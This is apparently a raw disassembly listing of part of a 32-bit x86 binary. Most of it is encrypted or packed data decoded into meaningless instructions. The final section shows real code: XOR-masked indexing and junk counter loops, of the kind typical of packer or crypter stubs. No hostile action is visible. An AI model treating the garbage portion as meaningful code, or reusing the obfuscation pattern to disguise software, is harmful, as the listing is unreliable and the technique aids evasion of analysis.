  42cd09:	repnz rcr eax,cl
  42cd0c:	mov    ebp,0xf3d2bfd8
  42cd11:	jecxz  0x42ccd2
  42cd13:	aad    0xbd
  42cd15:	(bad)  
  42cd16:	cli    
  42cd17:	neg    bl
  42cd19:	iret   
  42cd1a:	int    0xcb
  42cd1c:	pop    es
  42cd1d:	enter  0xede7,0xb3
  42cd21:	fdivr  st(5),st
  42cd23:	sti    
  42cd24:	rcr    cl,1
  42cd26:	(bad)  
  42cd27:	mov    bh,0xe5
  42cd29:	retf   0xfdb4
  42cd2c:	icebp  
  42cd2d:	cld    
  42cd2e:	ror    esi,cl
  42cd30:	idiv   edx
  42cd32:	idiv   DWORD PTR [esi-0x4231f43]
  42cd38:	jmp    0xbcef:0xef80fdf
  42cd3f:	xlat   BYTE PTR ds:[ebx]
  42cd40:	jmp    0x42cd34
  42cd42:	mov    dh,0xf7
  42cd44:	ret    
  42cd45:	aad    0xc7
  42cd47:	shr    al,cl
  42cd49:	(bad)  
  42cd4b:	icebp  
  42cd4c:	mov    edx,0xcddbdcd3
  42cd51:	lock add al,0xdc
  42cd54:	aad    0xe0
  42cd56:	out    0x5,eax
  42cd58:	(bad)  
  42cd59:	stc    
  42cd5a:	add    edi,esp
  42cd5c:	fucompp 
  42cd5e:	mov    eax,0xe2eebce2
  42cd63:	mov    ch,0xda
  42cd65:	into   
  42cd66:	shr    dl,cl
  42cd68:	shr    ah,1
  42cd6a:	std    
  42cd6b:	lock jmp 0xff1aca21
  42cd71:	ret    0xc5de
  42cd74:	(bad)
  42cd77:	call   esi
  42cd79:	pop    es
  42cd7a:	aad    0xc2
  42cd7c:	or     BYTE PTR [eax],al
  42cd7e:	jmp    0xb4f5:0xd4a8c2c6
  42cd85:	int3   
  42cd86:	retf   
  42cd87:	jmp    0x42cd51
  42cd89:	out    dx,eax
  42cd8a:	out    dx,eax
  42cd8b:	jmp    0x42cd7b
  42cd8d:	retf   0xbc00
  42cd90:	rcl    esp,0xe1
  42cd93:	add    al,0xbc
  42cd95:	in     eax,0xdb
  42cd97:	or     bl,ch
  42cd99:	inc    DWORD PTR [edi]
  42cd9b:	in     eax,0xd3
  42cd9d:	adc    ebp,ecx
  42cd9f:	fsub   st(4),st
  42cda1:	mov    ebp,0xeecaaae0
  42cda6:	repnz fcomp st(7)
  42cda9:	lods   al,BYTE PTR ds:[esi]
  42cdaa:	jmp    0x42cd79
  42cdac:	jecxz  0x42cd6b
  42cdae:	repnz mov edx,0xc6d3d9
  42cdb4:	lock mov eax,0xc6ddfee8
  42cdba:	push   cs
  42cdbb:	int3   
  42cdbc:	retf   0xc7f3
  42cdbf:	mov    cl,0xd6
  42cdc1:	mov    esp,0xc7f2bcf4
  42cdc6:	mov    ebx,0xf4ded4f5
  42cdcb:	enter  0xdaee,0xd7
  42cdcf:	fdivr  QWORD PTR [esi-0x220c10]
  42cdd5:	(bad)  
  42cdd6:	jmp    0x110d9bd
  42cddb:	int    0xeb
  42cddd:	int    0xe4
  42cddf:	retf   0xe0e7
  42cde2:	int3   
  42cde3:	int3   
  42cde4:	jecxz  0x42cdd3
  42cde6:	(bad)
  42cde9:	fcom   st(0)
  42cdeb:	in     al,dx
  42cdec:	out    dx,al
  42cded:	into   
  42cdee:	(bad)  
  42cdf0:	fiadd  DWORD PTR ds:0xc203f8f4
  42cdf6:	sti    
  42cdf7:	test   bl,0xe5
  42cdfa:	fdivr  st(4),st
  42cdfc:	out    0xfa,eax
  42cdfe:	into   
  42cdff:	shl    DWORD PTR [ebx-0x1c1e3343],cl
  42ce05:	stc    
  42ce06:	loopne 0x42cdfa
  42ce08:	mov    dh,0xc6
  42ce0a:	retf   0xbeeb
  42ce0d:	rcr    eax,1
  42ce0f:	hlt    
  42ce10:	add    dh,dh
  42ce12:	loopne 0x42cdfb
  42ce14:	std    
  42ce15:	(bad)  
  42ce16:	fsubp  st(2),st
  42ce18:	dec    BYTE PTR [ebx]
  42ce1a:	add    dl,cl
  42ce1c:	call   ebx
  42ce1e:	out    0xca,eax
  42ce20:	retf   
  42ce21:	lods   al,BYTE PTR ds:[esi]
  42ce22:	scas   al,BYTE PTR es:[edi]
  42ce23:	into   
  42ce24:	cli    
  42ce25:	cli    
  42ce26:	jmp    0xf911c7f1
  42ce2b:	mov    ebx,0x103fcfe
  42ce30:	rol    DWORD PTR [ecx],1
  42ce32:	ret    
  42ce33:	in     al,dx
  42ce34:	cld    
  42ce35:	add    esi,edi
  42ce37:	rol    bh,1
  42ce39:	(bad)  
  42ce3b:	fimul  DWORD PTR [edi*8-0x3a0d5217]
  42ce42:	retf   
  42ce43:	call   0xf0039303
  42ce48:	mov    edi,0xffc9ebe6
  42ce4d:	ror    ecx,cl
  42ce4f:	aam    0xbe
  42ce51:	pop    es
  42ce52:	shl    ebx,cl
  42ce54:	loopne 0x42ce17
  42ce56:	(bad)  
  42ce57:	hlt    
  42ce58:	xlat   BYTE PTR ds:[ebx]
  42ce59:	mov    esp,0xefcac5dd
  42ce5e:	shr    cl,0xf7
  42ce61:	mov    bl,0xab
  42ce63:	les    esi,FWORD PTR [edx-0x11252a29]
  42ce69:	jmp    0xb6c9:0xbde3efca
  42ce70:	mov    edi,0xf9f5fed8
  42ce75:	jecxz  0x42ce62
  42ce77:	out    0xda,al
  42ce79:	mov    esp,0xe7f3e1c3
  42ce7e:	out    dx,eax
  42ce7f:	xlat   BYTE PTR ds:[ebx]
  42ce80:	imul   edx
  42ce82:	out    dx,eax
  42ce83:	sti    
  42ce84:	lods   eax,DWORD PTR ds:[esi]
  42ce85:	iret   
  42ce86:	mov    dl,0xdf
  42ce88:	(bad)  
  42ce89:	cmc    
  42ce8a:	mov    ecx,0xdad7e3bc
  42ce8f:	int    0xfe
  42ce91:	rcr    ebp,1
  42ce93:	fsubrp st(5),st
  42ce95:	pop    es
  42ce96:	jecxz  0x42ce76
  42ce98:	psubsw mm7,mm4
  42ce9b:	jmp    0xb108bb7e
  42cea0:	call   0xd218bf6c
  42cea5:	not    ch
  42cea7:	rcr    ebx,1
  42cea9:	out    dx,eax
  42ceaa:	mov    ebp,0xb7d9d5f4
  42ceaf:	int3   
  42ceb0:	repnz cld 
  42ceb2:	repz test BYTE PTR [edi],0x2
  42ceb6:	out    0xf0,eax
  42ceb8:	psubusb mm0,mm3
  42cebb:	fcomp  st(1)
  42cebd:	les    edi,FWORD PTR [ecx-0x2b435a3b]
  42cec3:	lods   al,BYTE PTR ds:[esi]
  42cec4:	in     al,dx
  42cec5:	out    dx,al
  42cec6:	(bad)  
  42cec7:	scas   al,BYTE PTR es:[edi]
  42cec8:	fcomip st,st(1)
  42ceca:	hlt    
  42cecb:	mov    esi,0xe2d0f4d2
  42ced0:	cmc    
  42ced1:	cld    
  42ced2:	aam    0xe1
  42ced4:	fmul   st,st(3)
  42ced6:	(bad)  
  42ced8:	sti    
  42ced9:	mov    DWORD PTR [edi],0xe402e8d4
  42cedf:	call   0xc91ab6c9
  42cee4:	leave  
  42cee5:	retf   
  42cee6:	fldl2e 
  42cee8:	out    0xf7,eax
  42ceea:	push   edi
  42ceec:	out    dx,eax
  42ceed:	ret    
  42ceee:	aam    0xe0
  42cef0:	into   
  42cef1:	(bad)  
  42cef2:	loop   0x42cef7
  42cef4:	aad    0xfe
  42cef6:	ror    DWORD PTR [eax],0xe5
  42cef9:	or     DWORD PTR [eax],eax
  42cefb:	or     ecx,edi
  42cefd:	in     al,dx
  42cefe:	test   al,0xb3
  42cf00:	not    edi
  42cf02:	loop   0x42cef3
  42cf04:	mov    dh,0xf9
  42cf06:	jmp    0x42cec1
  42cf08:	aam    0xf3
  42cf0a:	enter  0xd3d7,0xd1
  42cf0e:	idiv   esp
  42cf10:	out    0xe3,al
  42cf12:	add    DWORD PTR [esi+0x8ebe5d1],edi
  42cf18:	enter  0xf8ee,0xe5
  42cf1c:	add    edx,ebx
  42cf1e:	scas   eax,DWORD PTR es:[edi]
  42cf1f:	scas   eax,DWORD PTR es:[edi]
  42cf20:	loope  0x42cf0e
  42cf22:	mov    ebp,0xb6accdd1
  42cf27:	mov    ecx,0xede4d9ed
  42cf2c:	std    
  42cf2d:	fdivr  st(0),st
  42cf2f:	out    0xbf,eax
  42cf31:	fcmovnb st,st(5)
  42cf33:	add    ebx,edi
  42cf35:	out    0xc0,al
  42cf37:	(bad)  
  42cf39:	or     esp,esi
  42cf3b:	enter  0xe3,0xd9
  42cf3f:	(bad)  
  42cf40:	out    0xed,al
  42cf42:	test   ebx,0xcadae7eb
  42cf48:	int    0xf9
  42cf4a:	in     eax,0xff
  42cf4c:	icebp  
  42cf4d:	lock loope 0x42cf38
  42cf50:	mov    ch,0x2
  42cf52:	lock fucom st(4)
  42cf55:	jmp    0xe34ab550
  42cf5a:	ret    
  42cf5b:	out    dx,al
  42cf5c:	out    0xc8,eax
  42cf5e:	retf   0xe0a8
  42cf61:	(bad)  
  42cf63:	(bad)
  42cf66:	mov    cl,0xe8
  42cf68:	fcomp  st(1)
  42cf6a:	out    dx,al
  42cf6b:	mov    esp,0xdcd5c2ee
  42cf70:	int    0xf7
  42cf72:	hlt    
  42cf73:	fsubp  st(2),st
  42cf75:	mov    BYTE PTR [eax*1-0x3a103429],0xc
  42cf7d:	or     bl,bh
  42cf7f:	jecxz  0x42cf60
  42cf81:	scas   al,BYTE PTR es:[edi]
  42cf82:	mov    dl,0xeb
  42cf84:	sti    
  42cf85:	neg    cl
  42cf87:	in     al,0xf6
  42cf89:	cli    
  42cf8a:	iret   
  42cf8b:	enter  0xd1f4,0xdf
  42cf8f:	hlt    
  42cf90:	aad    0xf0
  42cf92:	hlt    
  42cf93:	not    esp
  42cf95:	sti    
  42cf96:	jecxz  0x42cf9b
  42cf98:	iret   
  42cf99:	in     eax,0xf8
  42cf9b:	or     esp,esp
  42cf9d:	add    dl,al
  42cf9f:	mov    dl,0xa5
  42cfa1:	lods   al,BYTE PTR ds:[esi]
  42cfa2:	in     eax,0xf5
  42cfa4:	mov    ah,0xe4
  42cfa6:	ror    ch,cl
  42cfa8:	mov    ch,0xf8
  42cfaa:	fdiv   DWORD PTR [esi-0x3c084f23]
  42cfb0:	repz rol BYTE PTR [ebx],1
  42cfb3:	loop   0x42cf8d
  42cfb5:	add    eax,DWORD PTR [edx]
  42cfb7:	(bad)  
  42cfb8:	(bad)  
  42cfba:	aad    0xeb
  42cfbc:	iret   
  42cfbd:	adc    edi,DWORD PTR [ecx-0x1d3f220e]
  42cfc3:	int3   
  42cfc4:	int3   
  42cfc5:	in     eax,dx
  42cfc6:	repz in al,dx
  42cfc8:	(bad)  
  42cfc9:	call   0xd341b9c8
  42cfce:	mov    ebp,0xf1d7eefe
  42cfd3:	lock stc 
  42cfd5:	shl    dh,cl
  42cfd7:	xlat   BYTE PTR ds:[ebx]
  42cfd8:	leave  
  42cfd9:	jmp    0xc5ce:0xefeafcfe
  42cfe0:	mov    bh,0xee
  42cfe2:	test   eax,0xe6f4b4a9
  42cfe8:	in     al,dx
  42cfe9:	into   
  42cfea:	iret   
  42cfeb:	cld    
  42cfec:	clc    
  42cfed:	dec    bh
  42cfef:	fistp  QWORD PTR [esi+0xbc7d5d6]
  42cff5:	ret    
  42cff6:	in     eax,0xe6
  42cff8:	out    0xca,eax
  42cffa:	jecxz  0x42cffe
  42cffc:	or     eax,0xcbebc2cf
  42d001:	enter  0xd4b6,0xf7
  42d005:	in     al,0xd3
  42d007:	leave  
  42d008:	mov    edi,0xffe8d9f2
  42d00d:	repz xlat BYTE PTR ds:[ebx]
  42d00f:	cli    
  42d010:	(bad)  
  42d011:	aam    0xbb
  42d013:	rol    esp,1
  42d015:	ret    
  42d016:	fcmovb st,st(1)
  42d018:	xlat   BYTE PTR ds:[ebx]
  42d019:	in     eax,0xe9
  42d01b:	out    0xe1,eax
  42d01d:	shr    ch,0xc6
  42d020:	out    0xe3,al
  42d022:	in     eax,dx
  42d023:	repz shl eax,cl
  42d026:	mov    ebx,0xbfcbf7e6
  42d02b:	(bad)  
  42d02c:	sti    
  42d02d:	fcmovne st,st(0)
  42d02f:	clc    
  42d030:	fucom  st(6)
  42d032:	add    ecx,esp
  42d034:	aam    0xc5
  42d036:	shl    al,0xf8
  42d039:	(bad)  
  42d03a:	std    
  42d03b:	ret    0xc8f2
  42d03e:	fmulp  st(4),st
  42d040:	int    0xd0
  42d042:	(bad)  
  42d043:	mov    esp,0xd0f1b3c0
  42d048:	jmp    0x2cc:0x2d5efd0
  42d04f:	repnz sti 
  42d051:	add    ch,ah
  42d053:	in     al,dx
  42d054:	mov    esp,0xd800dc0b
  42d059:	add    esi,eax
  42d05b:	in     al,0xe6
  42d05d:	loope  0x42d02e
  42d05f:	enter  0xf7be,0xb3
  42d063:	in     eax,0xc0
  42d065:	mov    dl,0xf3
  42d067:	call   0x40da838
  42d06c:	int3   
  42d06d:	(bad)  
  42d06f:	cld    
  42d070:	clc    
  42d071:	add    eax,edi
  42d073:	add    BYTE PTR [esp+edi*4],al
  42d076:	fcmove st,st(2)
  42d078:	iret   
  42d079:	sti    
  42d07a:	in     al,0xff
  42d07c:	clc    
  42d07d:	shl    bl,cl
  42d07f:	loopne 0x42d04b
  42d081:	in     al,dx
  42d082:	enter  0xe5b2,0xe7
  42d086:	int3   
  42d087:	mov    al,0xb0
  42d089:	lock mov ecx,0xbdd6fedc
  42d08f:	int    0xc0
  42d091:	fld    st(6)
  42d093:	cld    
  42d094:	loope  0x42d074
  42d096:	add    cl,ah
  42d098:	pop    es
  42d099:	out    dx,eax
  42d09a:	loop   0x42d081
  42d09c:	cld    
  42d09d:	fucom  st(4)
  42d09f:	repz xlat BYTE PTR ds:[ebx]
  42d0a1:	lods   eax,DWORD PTR ds:[esi]
  42d0a2:	loop   0x42d097
  42d0a4:	lods   al,BYTE PTR ds:[esi]
  42d0a5:	(bad)
  42d0a8:	int    0xf0
  42d0aa:	fdivp  st(6),st
  42d0ac:	jecxz  0x42d085
  42d0ae:	int3   
  42d0af:	add    edi,esp
  42d0b1:	ret    0xf8de
  42d0b4:	or     esp,ecx
  42d0b6:	add    al,bl
  42d0b8:	retf   0xfde9
  42d0bb:	into   
  42d0bc:	loopne 0x42d0cd
  42d0be:	loope  0x42d081
  42d0c0:	(bad)  
  42d0c1:	icebp  
  42d0c2:	aam    0xe3
  42d0c4:	(bad)
  42d0c7:	ffreep st(6)
  42d0c9:	mov    al,0xb8
  42d0cb:	icebp  
  42d0cc:	xlat   BYTE PTR ds:[ebx]
  42d0cd:	xlat   BYTE PTR ds:[ebx]
  42d0ce:	xlat   BYTE PTR ds:[ebx]
  42d0cf:	idiv   ecx
  42d0d1:	(bad)  
  42d0d2:	fiadd  DWORD PTR [ebx]
  42d0d4:	repz (bad) 
  42d0d6:	out    0xf4,al
  42d0d8:	add    cl,BYTE PTR ds:0x13f90807
  42d0de:	retf   
  42d0df:	iret   
  42d0e0:	lock (bad) 
  42d0e3:	aad    0xe3
  42d0e5:	in     al,dx
  42d0e6:	(bad)  
  42d0e7:	aad    0xc9
  42d0e9:	jmp    0xd12f90ad
  42d0ee:	icebp  
  42d0ef:	fiadd  DWORD PTR [eax]
  42d0f1:	push   es
  42d0f2:	mov    esi,0xd0f7d5
  42d0f7:	bswap  edi
  42d0f9:	sar    bl,0x0
  42d0fc:	(bad)  
  42d0fd:	in     eax,dx
  42d0fe:	ret    
  42d0ff:	mov    al,0xc9
  42d101:	scas   eax,DWORD PTR es:[edi]
  42d102:	test   esi,0xcecbcff4
  42d108:	out    0xfe,eax
  42d10a:	int    0xd6
  42d10c:	in     eax,dx
  42d10d:	mov    esi,0xc6e7dcef
  42d112:	aad    0xf3
  42d114:	lock mul ah
  42d117:	aad    0xf5
  42d119:	add    ah,ah
  42d11b:	iret   
  42d11c:	fcmove st,st(3)
  42d11e:	out    0xc5,eax
  42d120:	ret    
  42d121:	aad    0xb6
  42d123:	fcmovnbe st,st(7)
  42d125:	out    0xc6,al
  42d127:	jmp    edi
  42d129:	mov    edi,0xd6d8b6bd
  42d12e:	fsub   st,st(1)
  42d130:	rcr    cl,cl
  42d132:	in     al,0xe3
  42d134:	xlat   BYTE PTR ds:[ebx]
  42d135:	loope  0x42d116
  42d137:	faddp  st(7),st
  42d139:	inc    BYTE PTR [edx]
  42d13b:	jmp    0xe204e301
  42d140:	leave  
  42d141:	jecxz  0x42d11f
  42d143:	sti    
  42d144:	call   0xeb22bd1d
  42d149:	fdiv   st,st(5)
  42d14b:	repz fyl2xp1 
  42d14e:	test   eax,0xc1f9f3f0
  42d154:	fscale 
  42d156:	ret    0xd7d0
  42d159:	or     bh,bh
  42d15b:	in     al,dx
  42d15c:	push   cs
  42d15d:	loopne 0x42d11c
  42d15f:	xlat   BYTE PTR ds:[ebx]
  42d160:	shr    DWORD PTR [eax-0x4a1c1c2c],cl
  42d166:	mov    ah,0xeb
  42d168:	(bad)  
  42d169:	(bad)  [edi-0xffe3c13]
  42d16f:	shl    edx,1
  42d171:	xlat   BYTE PTR ds:[ebx]
  42d172:	cli    
  42d173:	add    ebx,ecx
  42d175:	loop   0x42d174
  42d177:	or     DWORD PTR ds:0xccdef8f9,eax
  42d17d:	fnstcw WORD PTR [ebp-0x350e301b]
  42d183:	mov    cl,0xc0
  42d185:	in     al,0xcd
  42d187:	retf   0xbfde
  42d18a:	lock fcmovu st,st(6)
  42d18d:	in     al,dx
  42d18e:	fdivrp st(3),st
  42d190:	icebp  
  42d191:	out    dx,al
  42d192:	(bad)  
  42d193:	ret    
  42d194:	icebp  
  42d195:	(bad)  
  42d196:	fmul   st(1),st
  42d198:	jmp    0xc609b480
  42d19d:	(bad)  
  42d19e:	ror    ah,0xdf
  42d1a1:	in     al,0xc9
  42d1a3:	mov    dh,0xc5
  42d1a5:	ret    0xebd5
  42d1a8:	(bad)  
  42d1aa:	clc    
  42d1ab:	(bad)  
  42d1ad:	mov    eax,0xe607f5f4
  42d1b2:	push   es
  42d1b3:	sar    BYTE PTR [ecx+0x1ddf40b],1
  42d1b9:	add    eax,0xdf09ef01
  42d1be:	mov    ecx,0xd7c1c2cd
  42d1c3:	out    dx,al
  42d1c4:	loope  0x42d1ab
  42d1c6:	shl    eax,1
  42d1c8:	lods   eax,DWORD PTR ds:[esi]
  42d1c9:	(bad)  
  42d1ca:	(bad)  
  42d1cc:	clc    
  42d1cd:	fcomp  st(4)
  42d1cf:	neg    al
  42d1d1:	lock loop 0x42d197
  42d1d4:	fdivr  st,st(4)
  42d1d6:	or     eax,DWORD PTR [esi]
  42d1d8:	std    
  42d1d9:	out    dx,eax
  42d1da:	leave  
  42d1db:	(bad)  
  42d1dc:	(bad)  
  42d1dd:	clc    
  42d1de:	loop   0x42d1c7
  42d1e0:	mov    edi,0xb3f7ceec
  42d1e5:	sti    
  42d1e6:	aam    0xd1
  42d1e8:	fdiv   DWORD PTR [edi-0x352c070c]
  42d1ee:	add    BYTE PTR [ebx],al
  42d1f0:	out    dx,eax
  42d1f1:	fidivr DWORD PTR [edi+edi*8-0x81a3d21]
  42d1f8:	or     al,al
  42d1fa:	in     eax,0x2
  42d1fc:	(bad)  
  42d1fe:	icebp  
  42d1ff:	rcl    al,cl
  42d201:	lods   eax,DWORD PTR ds:[esi]
  42d202:	cmc    
  42d203:	lock shr dh,0xda
  42d207:	jmp    0xb4ea:0xc4b5ebc4
  42d20e:	inc    DWORD PTR [edx]
  42d210:	fucom  st(6)
  42d212:	in     al,dx
  42d213:	xlat   BYTE PTR ds:[ebx]
  42d214:	hlt    
  42d215:	repnz or ah,al
  42d218:	out    dx,al
  42d219:	(bad)  
  42d21a:	loopne 0x42d216
  42d21c:	repnz pop es
  42d21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d21f:	mov    esi,0xedc2afcf
  42d224:	lods   eax,DWORD PTR ds:[esi]
  42d225:	mov    ch,0xaf
  42d227:	out    0xd9,eax
  42d229:	leave  
  42d22a:	aad    0xec
  42d22c:	not    ch
  42d22e:	(bad)  
  42d230:	stc    
  42d231:	mul    esp
  42d233:	(bad)  
  42d234:	ffree  st(0)
  42d236:	ret    0xe6d9
  42d239:	(bad)  
  42d23a:	out    0x4,eax
  42d23c:	jmp    0xd230a205
  42d241:	loopne 0x42d1ef
  42d243:	div    dl
  42d245:	fucomi st,st(1)
  42d247:	stc    
  42d248:	mov    dh,0xcb
  42d24a:	repz mov ebp,0xcdedeeed
  42d250:	int3   
  42d251:	pop    es
  42d252:	fld    DWORD PTR [ebx+ecx*1]
  42d255:	rol    BYTE PTR [eax],0xe2
  42d258:	loopne 0x42d233
  42d25a:	out    0xa,al
  42d25c:	jmp    0x42d266
  42d25e:	shr    BYTE PTR [edx-0x4e0c1e09],0xe1
  42d265:	neg    cl
  42d267:	cmc    
  42d268:	imul   cl
  42d26a:	jmp    0xf0bc:0xdbf5e8bc
  42d271:	int    0xd5
  42d273:	test   bl,0xf6
  42d276:	in     eax,0xf
  42d278:	in     al,0xfc
  42d27a:	pop    es
  42d27b:	int    0xce
  42d27d:	add    eax,0xead3c3ed
  42d282:	lods   al,BYTE PTR ds:[esi]
  42d283:	out    dx,al
  42d284:	mov    dh,0xda
  42d286:	mov    dl,0xfa
  42d288:	sti    
  42d289:	idiv   DWORD PTR [esi-0x4105310a]
  42d28f:	clc    
  42d290:	mov    esi,0xfcbde5fa
  42d295:	or     eax,edx
  42d297:	jmp    0x42d256
  42d299:	out    dx,eax
  42d29a:	add    al,BYTE PTR [ebx]
  42d29c:	(bad)  
  42d29d:	shr    DWORD PTR [edx+esi*4-0x3216500d],cl
  42d2a4:	rol    dl,cl
  42d2a6:	cli    
  42d2a7:	xlat   BYTE PTR ds:[ebx]
  42d2a8:	jmp    0xde3e8ea1
  42d2ad:	mov    esp,0xd4c3f300
  42d2b2:	loope  0x42d276
  42d2b4:	loopne 0x42d272
  42d2b6:	(bad)  
  42d2b7:	rol    cl,1
  42d2b9:	add    cl,cl
  42d2bb:	stc    
  42d2bc:	push   es
  42d2bd:	or     eax,0xb2c1d2de
  42d2c2:	leave  
  42d2c3:	int3   
  42d2c4:	shl    bl,cl
  42d2c6:	aad    0xf7
  42d2c8:	stc    
  42d2c9:	int    0xdb
  42d2cb:	fdiv   st(4),st
  42d2cd:	xlat   BYTE PTR ds:[ebx]
  42d2ce:	add    ebx,ecx
  42d2d0:	idiv   BYTE PTR [edi+0x9c5f6dd]
  42d2d6:	clc    
  42d2d7:	jmp    eax
  42d2d9:	cld    
  42d2da:	(bad)  
  42d2dc:	in     eax,0xee
  42d2de:	mov    ecx,0xefb3a5c7
  42d2e3:	iret   
  42d2e4:	out    0xc4,eax
  42d2e6:	fsubr  st,st(1)
  42d2e8:	call   0xc42daddc
  42d2ed:	mov    eax,0xe0fabed7
  42d2f2:	mov    DWORD PTR [esi],0xdfeae703
  42d2f8:	mov    ebp,0xee09fec4
  42d2fd:	fcomp  st(1)
  42d2ff:	mov    al,0xcc
  42d301:	(bad)  
  42d302:	shl    bh,cl
  42d304:	jmp    0xf7b8:0xd6d0c0e0
  42d30b:	cld    
  42d30c:	retf   
  42d30d:	sti    
  42d30e:	mov    ebp,0xd1e7d1ed
  42d313:	hlt    
  42d314:	ret    0x8c6
  42d317:	mov    BYTE PTR [ecx],0x1
  42d31a:	or     ah,bl
  42d31c:	or     bl,dh
  42d31e:	shr    DWORD PTR [ecx-0x1515512a],1
  42d324:	jecxz  0x42d30e
  42d326:	mov    bh,0xcb
  42d328:	mov    al,0xf0
  42d32a:	mov    ah,0xcd
  42d32c:	retf   
  42d32d:	ret    0xffc1
  42d330:	out    0xdf,al
  42d332:	std    
  42d333:	mov    edx,0x3dffb06
  42d338:	shr    bh,0xf9
  42d33b:	pop    es
  42d33c:	pminsw mm4,mm1
  42d33f:	shl    esi,1
  42d341:	mov    cl,0xea
  42d343:	out    dx,al
  42d344:	int    0xfb
  42d346:	jmp    0xfc2dc22f
  42d34b:	mov    dl,0xbd
  42d34d:	enter  0xb6f7,0xce
  42d351:	int3   
  42d352:	icebp  
  42d353:	out    0xc6,eax
  42d355:	cld    
  42d356:	fsubr  st(7),st
  42d358:	vpmaxsw ymm3,ymm7,ymm0
  42d35c:	push   es
  42d35d:	int    0xe7
  42d35f:	fst    st(0)
  42d361:	(bad)  
  42d362:	mov    dh,0xf0
  42d364:	fstp   TBYTE PTR [edx-0x473a3729]
  42d36a:	(bad)  
  42d36c:	neg    dl
  42d36e:	ret    0xde01
  42d371:	(bad)  
  42d372:	int    0xc7
  42d374:	mov    ecx,0xfcb020a
  42d379:	retf   0xccd9
  42d37c:	in     eax,0xfe
  42d37e:	loopne 0x42d34b
  42d380:	lods   al,BYTE PTR ds:[esi]
  42d381:	jecxz  0x42d367
  42d383:	loop   0x42d37f
  42d385:	cli    
  42d386:	jmp    0xfbfe:0xbdeef4e4
  42d38d:	fmul   st,st(7)
  42d38f:	repnz stc 
  42d391:	icebp  
  42d392:	(bad)  
  42d394:	loop   0x42d393
  42d396:	lock in eax,0xfb
  42d399:	hlt    
  42d39a:	clc    
  42d39b:	(bad)  
  42d39c:	int    0xa
  42d39e:	ret    
  42d39f:	ret    
  42d3a0:	repnz mov esp,0xdbf0f4c7
  42d3a6:	(bad)  
  42d3a7:	jmp    0xf9d2:0xf9f6b6fa
  42d3ae:	fld    DWORD PTR [ecx]
  42d3b0:	push   es
  42d3b1:	fild   DWORD PTR ds:0xf1e70afb
  42d3b7:	lock retf 0xdef6
  42d3bb:	or     ah,bl
  42d3bd:	icebp  
  42d3be:	icebp  
  42d3bf:	repnz into 
  42d3c1:	cmc    
  42d3c2:	mov    dh,0xd1
  42d3c4:	lods   al,BYTE PTR ds:[esi]
  42d3c5:	in     al,dx
  42d3c6:	repz (bad) 
  42d3c8:	cli    
  42d3c9:	jmp    0x42d393
  42d3cb:	aad    0xee
  42d3cd:	into   
  42d3ce:	mov    bh,0xbf
  42d3d0:	int3   
  42d3d1:	sar    DWORD PTR [ebx-0x90b3d2f],cl
  42d3d7:	jmp    0xdda:0xcec9d4d4
  42d3de:	scas   eax,DWORD PTR es:[edi]
  42d3df:	out    0xb7,eax
  42d3e1:	sar    DWORD PTR [ebp+esi*8-0x25381245],cl
  42d3e8:	(bad)  
  42d3e9:	in     al,0xbf
  42d3eb:	idiv   al
  42d3ed:	(bad)  
  42d3ef:	mov    edi,0xf84d8be2
  42d3f4:	mov    al,BYTE PTR [ecx+eax*1+0x3272fb]
  42d3fb:	mov    BYTE PTR [ebp-0x25],al
  42d3fe:	mov    eax,DWORD PTR [ebp+0xc]
  42d401:	xor    eax,0x75108b5
  42d406:	mov    ecx,DWORD PTR [ebp+0x8]
  42d409:	xor    ecx,0x75108b5
  42d40f:	mov    edx,DWORD PTR [ebp-0x8]
  42d412:	mov    esi,DWORD PTR [ebp-0x8]
  42d415:	mov    al,BYTE PTR [esi+eax*1+0x3272fb]
  42d41c:	mov    BYTE PTR [edx+ecx*1+0x3272fb],al
  42d423:	mov    eax,DWORD PTR [ebp+0xc]
  42d426:	xor    eax,0x75108b5
  42d42b:	mov    ecx,DWORD PTR [ebp-0x8]
  42d42e:	mov    dl,BYTE PTR [ebp-0x25]
  42d431:	mov    BYTE PTR [ecx+eax*1+0x3272fb],dl
  42d438:	mov    eax,DWORD PTR [ebp+0xc]
  42d43b:	xor    eax,0x75108b5
  42d440:	add    eax,0x3272fb
  42d445:	pop    esi
  42d446:	leave  
  42d447:	ret    0x10
  42d44a:	push   ebp
  42d44b:	mov    ebp,esp
  42d44d:	sub    esp,0xa0
  42d453:	mov    eax,ds:0x43739f
  42d458:	adc    ecx,DWORD PTR ds:0x43775b
  42d45e:	mov    DWORD PTR [ebp-0x2c],eax
  42d461:	lea    eax,[ebp-0x3c]
  42d464:	mov    DWORD PTR [ebp-0x28],eax
  42d467:	mov    DWORD PTR ds:0x437763,0x13
  42d471:	cmp    DWORD PTR ds:0x437763,0x0
  42d478:	je     0x42d4c5
  42d47e:	cmp    DWORD PTR ds:0x437763,0x5
  42d485:	jle    0x42d4c5
  42d48b:	jmp    0x42d499
  42d490:	push   DWORD PTR [ebp-0x1c]
  42d493:	call   DWORD PTR ds:0x43c998
  42d499:	cmp    DWORD PTR ds:0x437763,0x6
  42d4a0:	jne    0x42d4b3
  42d4a6:	mov    ecx,DWORD PTR ds:0x437763
  42d4ac:	dec    ecx
  42d4ad:	mov    DWORD PTR ds:0x437763,ecx
  42d4b3:	mov    ecx,DWORD PTR ds:0x437763
  42d4b9:	dec    ecx
  42d4ba:	mov    DWORD PTR ds:0x437763,ecx
  42d4c0:	jmp    0x42d471
  42d4c5:	mov    eax,DWORD PTR [ebp-0x28]
  42d4c8:	and    DWORD PTR ds:0x437713,0x0
  42d4d2:	xor    ecx,ecx
  42d4d4:	add    ecx,DWORD PTR ds:0x437713
  42d4da:	inc    ecx
  42d4db:	mov    DWORD PTR ds:0x437713,ecx
  42d4e1:	cmp    DWORD PTR ds:0x437713,0x2a
  42d4e8:	jl     0x42d514
  42d4ee:	jmp    0x42d507
  42d4f3:	push   DWORD PTR [ebp-0x1c]
  42d4f6:	push   DWORD PTR [ebp-0x20]
  42d4f9:	push   0x43779f
  42d4fe:	push   DWORD PTR [ebp-0x24]
  42d501:	call   DWORD PTR ds:0x43c99c
  42d507:	cmp    DWORD PTR ds:0x437713,0x1e
  42d50e:	jb     0x42d4d2
  42d514:	mov    ecx,DWORD PTR ds:0x4374bf
  42d51a:	adc    DWORD PTR ds:0x437727,0x6e64
  42d524:	mov    DWORD PTR [eax],ecx
  42d526:	adc    ecx,DWORD PTR ds:0x43772f
  42d52c:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  42d533:	adc    DWORD PTR ds:0x437733,ebx
  42d539:	mov    DWORD PTR [ebp-0x90],0xf89c85b3
